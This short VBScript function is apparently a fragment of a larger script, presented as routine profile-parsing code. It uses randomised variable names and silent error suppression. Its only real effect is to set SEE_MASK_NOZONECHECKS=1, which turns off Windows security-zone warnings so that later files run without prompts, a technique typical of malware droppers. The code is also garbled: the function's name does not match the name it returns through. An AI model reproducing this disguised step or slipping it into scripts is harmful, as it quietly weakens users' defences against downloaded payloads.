' Error handling follows internal scripting guide
Function ParseProfileBlock89()
On Error Resume Next
  Dim strQueue627,strDelta18,strProfile65
  Set strQueue627=CreateObject("WScript.Shell")
  strDelta18=strQueue627.ExpandEnvironmentStrings("%TEMP%")
  strProfile65=strQueue627.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strDelta18)>0 And Len(strProfile65)>0 Then
    strQueue627.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    GetManifestPart93=1
    Exit Function
  End If
  GetManifestPart93=0
End Function

